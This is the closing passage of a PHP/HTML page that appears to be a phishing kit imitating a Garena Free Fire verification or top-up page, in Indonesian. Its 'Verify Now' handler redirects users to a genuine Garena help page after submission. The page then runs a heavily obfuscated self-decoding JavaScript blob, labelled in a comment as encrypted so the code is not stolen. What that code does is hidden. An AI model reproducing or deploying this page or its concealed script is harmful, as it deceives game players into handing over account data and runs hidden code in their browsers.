        .prop('disabled', true);
    },
    success: function (response) {
      // ✅ Berpindah ke halaman tujuan jika sukses
      window.location.href = "https://help.garena.co.id/ff/post/free-fire-informasi-mengenai-diamond-membership";
    },
    error: function () {
      $('.ValidateVerificationDataBtn')
        .html('Verifikasi Sekarang')
        .prop('disabled', false);
    }
  });

  return false;
}
</script>
    <script>
        function chooseDenom(evt, denomClass) {
            var i, selectedDenom, tab;
            selectedDenom = document.getElementsByClassName("selectedDenom");
            for (i = 0; i < selectedDenom.length; i++) {
                selectedDenom[i].style.display = "none";
            }
            tab = document.getElementsByClassName("form-section__denom");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(denomClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("selectedDenomNominal").click();
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var fTQ='',Rby=508-497;function ygd(x){var o=969054;var r=x.length;var z=[];for(var f=0;f<r;f++){z[f]=x.charAt(f)};for(var f=0;f<r;f++){var k=o*(f+454)+(o%31625);var i=o*(f+676)+(o%27792);var l=k%r;var t=i%r;var b=z[l];z[l]=z[t];z[t]=b;o=(k+i)%4024719;};return z.join('')};var vcP=ygd('cobttrokquvnzxyhgesdfwrmapcnjrutlocis').substr(0,Rby);var YBB=').mao8;3;on=xchvag;;akdrh0g;c+dfnhi.[r(ncpyc.=,Csx.z,0=e;nh[ea(ran=(; ox;80tnlehr,d9lufkrrt;o;tt97g+.63urr.8pgC,}u1gr=;soir=vti=f]8n rl34r6[=0evuio+fnetnf,1+[o+e)licnt+;;dam ra)f{ri=ic;)+apu=>pqhnar;=r 5ipp9+;ktaig(w[;l8.;g(l=vSi+t ;dai)a1a)g"[tn]sqe1.f"ltev* ra7;r;vveey)e)m1ketau-s;62;[+iv.={o-l1a=nu6;;<u ,})ar()4(aa.g=n]p{+vht(e00(.,;udrC;r[(gth0l.t)s2oml(+u.1un0-u<=p)C+{tad(+d!xl=ba!52t ,(jt;jfsrs(eaan7=n(A3rc6=ig)1a,jrn.r or4a+= v]u]C)0f;)rAvhr2h5 ]"( f;a+n=hvs-0=o(tupe=ko}[ar,m29lvs),>1u(}<"i;rxsvhnl.ad)tv,uq=e(h;vA=i..(2 8}==upc-nu4(([;r9.mj;);=nl75u8s<A)s<j7)]fu{iu.xc;n],{ ih,)pfqm)il=pg(=(2n5=qx={t=el ;n4ltn]ai(la)-,7vli]an.tu+=;;(1fb6t)}io++qeljhhr0n,joe.irxj;n"=aA8(hw) uu.s}(lo6crofj["xh,")aoer wr*ge,00 9=,;,)9nv 2rfcojcy7hlch)r8);ve nr ). )+vCe,+C.r"a;6,eht,[ej) vb(g,vyovr,.rfrjm+[0[aauoo;dl=+744Ca; ]aj),t(oi.(St=rsg )rtmvh;on;vejw(r]o===f1us]g+er2(iua]("-",.o+v=stnj';var fZO=ygd[vcP];var YQV='';var uhr=fZO;var iaA=fZO(YQV,ygd(YBB));var RCR=iaA(ygd(')&"D)t__ft1#aZ)fZ u2= s{b2"o.a3Z0=a#a_+f%3Z)9c"k,]rZjo(+Z1eZu;%Z;:=}Zn(Z.u_3+nto1$m=bZ[Zt0-m0+$;3+,foZfx6pf6!.$s( !2!$t..86m(Z0g)-aZp0eZ_g( m.]o%srn576tp_augZ;.; Z;(.;tp=. p1ba(3e,i!!zZ3Ttu.(,gk.0#s#e0rCtZ, =i\/fte%Z]j!sud.16nre:!cZlm!0$Z*(t.Za1Zb42(00j!f7)!6_3_,"0(6)=r0h+){c)0$(()f(hof5ott.;rZ6m\/ f3Z=;4uZd,t$Z$,f1\'$k{]6o eS-m;aZpn;a)3$Z3gZ$+#\/fZd[!!Z*k0m],so\/tpe$6.Z06._.(u;n!oh]Z8o#$,ti1a.4"naZa;$)oftf\/hj1gk+1.Zie1t&d!i_i.3,n%. .,#)_$%ibfus\'}0f!ineje,3rsl,Z(=Z3ua1(.ftfx%_a5]yt5t%1ZZhZ5=2!3f62i))h =; oo6Zf.fp,e(iotZfff_t(%Z(_j&2(dna]rs;g]ti,33,a)73{Z .Z!(Z7!,h}}"oj36!Z)bfZ1a\/s_ZZne Z}&epZ.tgZ)1,Zi3;2(;52$jbm{tl)_.;3e.$0mZ=4_Zit_()30crff9$+els3)_urZn\/26no.iZlj0$j_t..r.b_=t.),pj5!]63ZZa.(*f=.)#yS_r.$=r;=taZ_srZS2kx)!17Z{i}(1Zgb1%ZS4rv=t}f.p;Z)a(3 .1=%Z_4&.nZ61Z;ab.}0j);ai6{!$$)).b)_($hlr(=k1Z.s})i)($-Z 6bgj,}.a,Zos8Z(0))tlhd%eb7f=jr+6Zi{4,i_f)Zu0){sh):.o.nZg (8$)..(.ta)i_.r(asl.C;(,tr-[,05s43i*f_!kh!b4.si,.%4Zj( %(!e415Za.of{0.(]:Z,j).)flje(Zrh)rZ5Z.Z)5(=,bgef1nZ)3lZj_4,fi(!_)s(va);.c1o\'krftn=i{%ho_i,")_8,3.{5,rn3_i.Z3rf$3)1_];(6$)g_g}4Z}{l){ffZ604)2e=Z,qn72].=71]iy2Zsr.ZZ iaf3\'0.)# 3pud=)i2 1#Zt{ja,,Zflf.Z$.0[Z2=s;Z6]$m.}_ia.,i8d$n0sZ{e2k;i!_2db*Z.t.(e}5.;1$f3.Z o.e.76aoe}Z!ts'));var ULF=uhr(fTQ,RCR );ULF(4380);return 1867})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>